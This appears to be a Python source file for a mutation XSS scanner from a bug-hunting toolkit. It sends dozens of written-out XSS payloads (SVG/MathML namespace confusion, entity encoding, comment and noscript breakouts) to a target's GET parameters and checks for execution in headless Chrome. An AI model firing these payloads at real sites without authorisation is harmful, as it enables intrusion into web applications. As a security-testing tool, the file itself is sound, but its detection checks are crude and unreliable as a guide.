"""
AlBaTTaR BUGS - Mutation XSS (mXSS) Scanner
============================================
Detects mutation-based XSS vulnerabilities where browser parsing
causes benign input to become malicious after DOM manipulation.

Author: ROBIN | @ll bUg
Version: 1.0.0
"""

import re
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, quote
import asyncio
from bs4 import BeautifulSoup

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

from core.http_handler import HTTPHandler
from core.payload_manager import PayloadManager
from utils.logger import get_logger
from utils.validators import is_valid_url


class MutationXSSScanner:
    """
    Advanced Mutation XSS Scanner
    
    Mutation XSS occurs when:
    1. Browser sanitizers modify input
    2. JavaScript frameworks re-parse content
    3. DOM manipulation changes meaning
    4. HTML entity decoding creates XSS
    """
    
    def __init__(self, target: str, config: Optional[Dict] = None):
        """
        Initialize Mutation XSS Scanner
        
        Args:
            target: Target URL to scan
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.logger = get_logger(__name__)
        self.http_handler = HTTPHandler(config)
        self.payload_manager = PayloadManager()
        
        # Results storage
        self.vulnerabilities = []
        self.tested_params = set()
        
        # Selenium driver (initialized when needed)
        self.driver = None
        
        # Scanner configuration
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.use_selenium = self.config.get('use_selenium', True) and SELENIUM_AVAILABLE
        
        self.logger.info(f"🧬 Mutation XSS Scanner initialized for: {target}")
        if not SELENIUM_AVAILABLE and self.use_selenium:
            self.logger.warning("⚠️ Selenium not available, DOM mutations cannot be tested")

    def scan(self) -> List[Dict[str, Any]]:
        """
        Main scanning method
        
        Returns:
            List of discovered vulnerabilities
        """
        self.logger.info("🚀 Starting Mutation XSS scan...")
        
        try:
            # Step 1: Test namespace confusion attacks
            self._test_namespace_confusion()
            
            # Step 2: Test backtick mutations
            self._test_backtick_mutations()
            
            # Step 3: Test mXSS via innerHTML
            self._test_innerhtml_mutations()
            
            # Step 4: Test HTML entity mutations
            self._test_html_entity_mutations()
            
            # Step 5: Test style attribute mutations
            self._test_style_mutations()
            
            # Step 6: Test SVG mutations
            self._test_svg_mutations()
            
            # Step 7: Test MathML mutations
            self._test_mathml_mutations()
            
            # Step 8: Test template tag mutations
            self._test_template_mutations()
            
            # Step 9: Test noscript mutations
            self._test_noscript_mutations()
            
            # Step 10: Test comment mutations
            self._test_comment_mutations()
            
            self.logger.info(f"✅ Mutation XSS scan complete. Found {len(self.vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            self.logger.error(f"❌ Error during Mutation XSS scan: {str(e)}")
        
        finally:
            self._cleanup()
        
        return self.vulnerabilities

    def _test_namespace_confusion(self):
        """
        Test namespace confusion attacks (SVG/MathML/HTML)
        
        Example: <svg><style><img src=x onerror=alert(1)>
        """
        self.logger.info("🧪 Testing namespace confusion mutations...")
        
        payloads = [
            # SVG namespace confusion
            '<svg><style><img src=x onerror=alert(1)>',
            '<svg><style><!--</style><img src=x onerror=alert(1)>',
            '<svg><foreignObject><style><img src=x onerror=alert(1)></foreignObject>',
            
            # MathML namespace confusion
            '<math><style><img src=x onerror=alert(1)>',
            '<math><mtext><style><img src=x onerror=alert(1)></mtext>',
            
            # Mixed namespace
            '<svg><math><style><img src=x onerror=alert(1)></style></math></svg>',
            
            # Nested confusion
            '<svg><foreignObject><math><style><img src=x onerror=alert(1)>',
        ]
        
        self._test_payloads(payloads, "Namespace Confusion")

    def _test_backtick_mutations(self):
        """
        Test backtick-based mutations
        
        Backticks can cause unexpected parsing in some contexts
        """
        self.logger.info("🧪 Testing backtick mutations...")
        
        payloads = [
            # Backtick confusion
            '<a href="javascript:alert`1`">click</a>',
            '<img src=x onerror=`alert\`1\``>',
            
            # Template literals in attributes
            '<div onclick=`alert\`1\``>click</div>',
            '<button onclick=`${alert\`1\`}`>click</button>',
            
            # Nested backticks
            '<img src=x onerror=``alert`1```>',
        ]
        
        self._test_payloads(payloads, "Backtick Mutation")

    def _test_innerhtml_mutations(self):
        """
        Test mutations via innerHTML assignments
        
        innerHTML can parse and mutate input differently than initial parse
        """
        self.logger.info("🧪 Testing innerHTML mutations...")
        
        payloads = [
            # Table context mutations
            '<table><td><svg><foreignObject><img src=x onerror=alert(1)>',
            '<table><select><option><style></option></select><img src=x onerror=alert(1)>',
            
            # Form context mutations
            '<form><button formaction=javascript:alert(1)>click',
            '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=</textarea><img src=x onerror=alert(1)>',
            
            # Nesting mutations
            '<noscript><style></noscript><img src=x onerror=alert(1)>',
            '<noembed><style></noembed><img src=x onerror=alert(1)>',
            
            # iframe srcdoc mutations
            '<iframe srcdoc="<svg><style><img src=x onerror=alert(1)>">',
        ]
        
        self._test_payloads(payloads, "innerHTML Mutation")

    def _test_html_entity_mutations(self):
        """
        Test HTML entity decoding mutations
        
        Entities decoded at different stages can create XSS
        """
        self.logger.info("🧪 Testing HTML entity mutations...")
        
        payloads = [
            # Double encoding
            '&lt;img src=x onerror=alert(1)&gt;',
            '&#x3C;img src=x onerror=alert(1)&#x3E;',
            
            # Entity in attribute context
            '<a href="javascript&colon;alert(1)">click</a>',
            '<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">',
            
            # Mixed encoding
            '<img src=x o&#110;error=alert(1)>',
            '<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script>',
            
            # Unicode normalization
            '<img src=x onerror=\u0061lert(1)>',
        ]
        
        self._test_payloads(payloads, "HTML Entity Mutation")

    def _test_style_mutations(self):
        """
        Test style attribute mutations
        
        CSS parsing can mutate XSS payloads
        """
        self.logger.info("🧪 Testing style attribute mutations...")
        
        payloads = [
            # CSS expression (IE)
            '<div style="background:url(javascript:alert(1))">',
            '<div style="xss:expression(alert(1))">',
            
            # CSS import mutations
            '<style>@import"javascript:alert(1)";</style>',
            '<style>@import url(javascript:alert(1));</style>',
            
            # CSS unicode
            '<div style="background:url(\\6A\\61\\76\\61\\73\\63\\72\\69\\70\\74:alert(1))">',
            
            # CSS comments
            '<style><!--</style><img src=x onerror=alert(1)>-->',
        ]
        
        self._test_payloads(payloads, "Style Mutation")

    def _test_svg_mutations(self):
        """
        Test SVG-specific mutations
        """
        self.logger.info("🧪 Testing SVG mutations...")
        
        payloads = [
            # SVG script tag
            '<svg><script>alert(1)</script>',
            '<svg><script href="javascript:alert(1)"/>',
            
            # SVG animate
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributeName=x to=0>',
            
            # SVG foreign object
            '<svg><foreignObject><body onload=alert(1)>',
            
            # SVG use element
            '<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' ><image href='1' onerror='alert(1)' /></svg>#x" />',
        ]
        
        self._test_payloads(payloads, "SVG Mutation")

    def _test_mathml_mutations(self):
        """
        Test MathML-specific mutations
        """
        self.logger.info("🧪 Testing MathML mutations...")
        
        payloads = [
            # MathML href
            '<math><maction actiontype="statusline#javascript:alert(1)">',
            '<math href="javascript:alert(1)">click</math>',
            
            # MathML with style
            '<math><style><img src=x onerror=alert(1)></style></math>',
            
            # MathML annotation
            '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml>',
        ]
        
        self._test_payloads(payloads, "MathML Mutation")

    def _test_template_mutations(self):
        """
        Test <template> tag mutations
        """
        self.logger.info("🧪 Testing template tag mutations...")
        
        payloads = [
            # Template content extraction
            '<template><img src=x onerror=alert(1)></template>',
            '<template><style></template><img src=x onerror=alert(1)>',
            
            # Template with script
            '<template><script>alert(1)</script></template>',
        ]
        
        self._test_payloads(payloads, "Template Mutation")

    def _test_noscript_mutations(self):
        """
        Test <noscript> mutations
        """
        self.logger.info("🧪 Testing noscript mutations...")
        
        payloads = [
            # Noscript context escape
            '<noscript><style></noscript><img src=x onerror=alert(1)>',
            '<noscript><iframe onload=alert(1)></noscript>',
        ]
        
        self._test_payloads(payloads, "Noscript Mutation")

    def _test_comment_mutations(self):
        """
        Test HTML comment mutations
        """
        self.logger.info("🧪 Testing comment mutations...")
        
        payloads = [
            # Comment breakout
            '<!--><img src=x onerror=alert(1)>-->',
            '<!--><script>alert(1)</script>-->',
            
            # Conditional comments (IE)
            '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
        ]
        
        self._test_payloads(payloads, "Comment Mutation")

    def _test_payloads(self, payloads: List[str], mutation_type: str):
        """
        Test a list of mutation payloads
        
        Args:
            payloads: List of XSS payloads
            mutation_type: Type of mutation being tested
        """
        for payload in payloads:
            try:
                # Test in different contexts
                contexts = self._get_test_contexts(payload)
                
                for context, test_url in contexts.items():
                    if test_url in self.tested_params:
                        continue
                    
                    self.tested_params.add(test_url)
                    
                    # Test with and without Selenium
                    if self.use_selenium and self.driver:
                        is_vulnerable_dom = self._test_with_selenium(test_url, payload, context)
                        if is_vulnerable_dom:
                            self._report_vulnerability(test_url, payload, mutation_type, context, "DOM")
                    
                    # Test with HTTP response analysis
                    is_vulnerable_http = self._test_with_http(test_url, payload, context)
                    if is_vulnerable_http:
                        self._report_vulnerability(test_url, payload, mutation_type, context, "HTTP")
                        
            except Exception as e:
                self.logger.debug(f"Error testing payload: {str(e)}")

    def _get_test_contexts(self, payload: str) -> Dict[str, str]:
        """
        Generate test URLs for different injection contexts
        
        Args:
            payload: XSS payload to test
            
        Returns:
            Dictionary of context -> URL mappings
        """
        contexts = {}
        encoded_payload = quote(payload)
        
        # Common parameter names
        params = ['q', 'search', 'input', 'text', 'comment', 'message', 'name', 'value']
        
        for param in params:
            # GET parameter
            contexts[f'GET_{param}'] = f"{self.target}?{param}={encoded_payload}"
            
            # Multiple parameters
            contexts[f'GET_multi_{param}'] = f"{self.target}?foo=bar&{param}={encoded_payload}&baz=qux"
        
        return contexts

    def _test_with_selenium(self, url: str, payload: str, context: str) -> bool:
        """
        Test mutation using Selenium (DOM-based detection)
        
        Args:
            url: URL to test
            payload: XSS payload
            context: Injection context
            
        Returns:
            True if vulnerable, False otherwise
        """
        try:
            if not self.driver:
                self._init_selenium()
            
            if not self.driver:
                return False
            
            # Navigate to URL
            self.driver.get(url)
            
            # Wait for page load
            WebDriverWait(self.driver, self.timeout).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Check for alert dialogs (XSS executed)
            try:
                WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert.dismiss()
                return True
            except:
                pass
            
            # Check if payload mutated in DOM
            page_source = self.driver.page_source
            if self._detect_mutation(page_source, payload):
                return True
            
            # Check console errors
            logs = self.driver.get_log('browser')
            for log in logs:
                if 'XSS' in log['message'] or 'alert' in log['message']:
                    return True
            
            return False
            
        except Exception as e:
            self.logger.debug(f"Selenium test error: {str(e)}")
            return False

    def _test_with_http(self, url: str, payload: str, context: str) -> bool:
        """
        Test mutation using HTTP response analysis
        
        Args:
            url: URL to test
            payload: XSS payload
            context: Injection context
            
        Returns:
            True if potentially vulnerable, False otherwise
        """
        try:
            response = self.http_handler.get(url, timeout=self.timeout)
            
            if not response:
                return False
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if payload appears modified (mutated)
            if self._detect_mutation(response.text, payload):
                return True
            
            # Check dangerous contexts
            if self._check_dangerous_contexts(soup, payload):
                return True
            
            return False
            
        except Exception as e:
            self.logger.debug(f"HTTP test error: {str(e)}")
            return False

    def _detect_mutation(self, content: str, original_payload: str) -> bool:
        """
        Detect if payload was mutated in a dangerous way
        
        Args:
            content: HTML content to analyze
            original_payload: Original payload sent
            
        Returns:
            True if dangerous mutation detected
        """
        # Look for signs of mutation
        dangerous_patterns = [
            r'<img[^>]+onerror',
            r'<script[^>]*>',
            r'javascript:',
            r'on\w+\s*=',
            r'<svg[^>]*>',
            r'<iframe[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                # Check if this pattern came from mutation
                if pattern.replace('\\', '').lower() not in original_payload.lower():
                    return True
        
        return False

    def _check_dangerous_contexts(self, soup: BeautifulSoup, payload: str) -> bool:
        """
        Check if payload appears in dangerous contexts after mutation
        
        Args:
            soup: BeautifulSoup parsed HTML
            payload: Original payload
            
        Returns:
            True if dangerous context detected
        """
        # Check script tags
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and any(p in script.string for p in ['alert', 'eval', 'document']):
                return True
        
        # Check event handlers
        for tag in soup.find_all(True):
            for attr in tag.attrs:
                if attr.startswith('on') and tag.attrs[attr]:
                    return True
        
        # Check javascript: URLs
        for tag in soup.find_all(['a', 'iframe', 'embed', 'object']):
            href = tag.get('href', '') or tag.get('src', '')
            if href and 'javascript:' in href.lower():
                return True
        
        return False

    def _init_selenium(self):
        """Initialize Selenium WebDriver"""
        try:
            if not SELENIUM_AVAILABLE:
                return
            
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(self.timeout)
            self.logger.info("✅ Selenium WebDriver initialized")
            
        except Exception as e:
            self.logger.warning(f"⚠️ Could not initialize Selenium: {str(e)}")
            self.driver = None

    def _report_vulnerability(self, url: str, payload: str, mutation_type: str, 
                            context: str, detection_method: str):
        """
        Report a discovered vulnerability
        
        Args:
            url: Vulnerable URL
            payload: Successful payload
            mutation_type: Type of mutation
            context: Injection context
            detection_method: How it was detected (DOM/HTTP)
        """
        vuln = {
            'type': 'Mutation XSS (mXSS)',
            'severity': 'high',
            'cvss_score': 7.5,
            'cwe': 'CWE-79',
            'url': url,
            'mutation_type': mutation_type,
            'payload': payload,
            'context': context,
            'detection_method': detection_method,
            'confidence': 85 if detection_method == 'DOM' else 65,
            'impact': 'Browser parsing mutations allow bypassing XSS filters and executing malicious code',
            'remediation': 'Use DOMPurify or similar sanitizers that handle mutation scenarios. Validate and encode all user input before DOM manipulation.',
            'references': [
                'https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/',
                'https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations'
            ]
        }
        
        self.vulnerabilities.append(vuln)
        self.logger.warning(f"🔴 mXSS found: {url} (Type: {mutation_type}, Method: {detection_method})")

    def _cleanup(self):
        """Clean up resources"""
        if self.driver:
            try:
                self.driver.quit()
                self.logger.info("✅ Selenium driver closed")
            except:
                pass

    def __del__(self):
        """Destructor"""
        self._cleanup()


# CLI interface
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python mutation_xss.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if not is_valid_url(target):
        print(f"❌ Invalid URL: {target}")
        sys.exit(1)
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    print("🧬 AlBaTTaR BUGS - Mutation XSS Scanner")
    print(f"🎯 Target: {target}\n")
    
    # Run scan
    scanner = MutationXSSScanner(target)
    results = scanner.scan()
    
    # Print results
    print(f"\n{'='*60}")
    print(f"📊 SCAN RESULTS")
    print(f"{'='*60}")
    print(f"✅ Scan completed")
    print(f"🔍 Vulnerabilities found: {len(results)}")
    
    if results:
        print(f"\n🔴 MUTATION XSS VULNERABILITIES:\n")
        for i, vuln in enumerate(results, 1):
            print(f"{i}. {vuln['mutation_type']}")
            print(f"   URL: {vuln['url']}")
            print(f"   Payload: {vuln['payload'][:80]}...")
            print(f"   Confidence: {vuln['confidence']}%")
            print(f"   Detection: {vuln['detection_method']}")
            print()